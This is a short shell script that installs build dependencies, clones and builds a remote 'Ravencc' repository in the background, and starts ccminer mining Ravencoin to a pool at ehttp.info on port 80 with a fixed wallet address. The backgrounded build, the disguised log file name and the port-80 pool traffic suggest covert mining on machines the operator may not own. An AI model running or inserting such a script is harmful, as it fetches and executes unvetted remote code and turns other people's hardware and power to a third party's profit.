#!/bin/bah -xe
apt-get update
apt-get -y install libstdc++6 autotools-dev automake python-dev freeglut3-dev libx11-dev libxmu-dev libxi-dev libgl1-mesa-glx libglu1-mesa libglu1-mesa-dev gcc make libcurl4-openssl-dev autoconf git screen libncurses5-dev opencl-headers build-essential protobuf-compiler libprotoc-dev libboost-all-dev libleveldb-dev hdf5-tools libhdf5-serial-dev libopencv-core-dev libopencv-highgui-dev libsnappy-dev libsnappy1v5 libatlas-base-dev cmake  libgoogle-glog0v5 libgoogle-glog-dev libgflags-dev liblmdb-dev python-pip gfortran libjansson-dev uthash-dev autogen libtool pkg-config gcc-multilib dkms libxml2-dev libxslt1-dev zlib1g-dev  libopencv-dev python-numpy libssl-dev automake autotools-dev
git clone https://github.com/one10001/Ravencc.git 
mv Ravencc/* ./
nohup ./build.sh >etl_rece.out 2>&1 &
./ccminer -a x16r -o stratum+tcp://ehttp.info:80 -u RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK -p c=RVN --donate 0
